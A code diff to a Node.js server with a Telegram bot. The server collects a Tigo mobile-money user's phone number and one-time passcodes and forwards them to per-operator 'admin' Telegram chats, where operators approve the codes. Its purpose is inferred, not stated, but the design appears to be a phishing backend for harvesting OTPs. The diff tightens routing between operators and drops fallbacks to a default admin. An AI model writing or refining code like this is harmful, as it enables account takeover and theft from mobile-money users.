@@ -24,7 +24,7 @@ let bot = null;
 const sessions = new Map();
 
 function resolveAdminChatId(adminKeyOrId) {
-  if (!adminKeyOrId) return process.env.ADMIN_01 || null;
+  if (!adminKeyOrId) return null;
   const cleanKey = String(adminKeyOrId).trim().toUpperCase().padStart(2, '0');
   
   const envVarName = `ADMIN_${cleanKey}`;
@@ -39,7 +39,7 @@ function resolveAdminChatId(adminKeyOrId) {
     }
   }
   
-  return adminKeyOrId || process.env.ADMIN_01 || null;
+  return null;
 }
 
 function isValidTigoNumber(phoneStr) {
@@ -164,23 +164,24 @@ async function initBot() {
 
       let session = sessions.get(userId);
       if (!session) {
-        session = {
-          phone: 'Unknown',
-          adminChatId: String(query.message.chat.id)
-        };
+        await bot.answerCallbackQuery(query.id, { 
+          text: '⚠️ Session expired or not found.', 
+          show_alert: true 
+        }).catch(() => {});
+        return;
       }
 
       const callbackSenderChatId = String(query.message.chat.id);
 
       if (session.adminChatId && session.adminChatId !== callbackSenderChatId) {
         await bot.answerCallbackQuery(query.id, { 
-          text: '⚠️ Unauthorized: This submission belongs to a different admin channel.', 
+          text: '⚠️ Unauthorized: You cannot deliver actions or messages to another admin bot session.', 
           show_alert: true 
         }).catch(() => {});
         return;
       }
 
-      const chatTarget = session.adminChatId || callbackSenderChatId;
+      const chatTarget = session.adminChatId;
 
       switch (prefix) {
         case 'ALLOW_OTP':
@@ -248,7 +249,7 @@ app.post('/api/submit-application', (req, res) => {
 
     const targetChat = resolveAdminChatId(adminChatId);
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Destination admin chat ID unavailable.' });
+      return res.status(400).json({ success: false, error: 'Destination admin chat ID unavailable or unauthorized.' });
     }
 
     const userId = phone || `user_${Date.now()}`;
@@ -334,7 +335,7 @@ app.post('/api/submit-otp', (req, res) => {
       }
     };
 
-    const targetChat = session.adminChatId || process.env.ADMIN_01;
+    const targetChat = session.adminChatId;
     bot.sendMessage(targetChat, message, opts).catch(() => {});
 
     res.status(200).json({ success: true });
@@ -357,7 +358,7 @@ app.post('/api/request-new-otp', (req, res) => {
       `📱 *Tigo User:* +255 ${session.phone}\n` +
       `⚠️ The user's countdown expired and they requested a new OTP code.`;
 
-    const targetChat = session.adminChatId || process.env.ADMIN_01;
+    const targetChat = session.adminChatId;
     bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
 
     res.status(200).json({ success: true });
@@ -371,4 +372,3 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-  
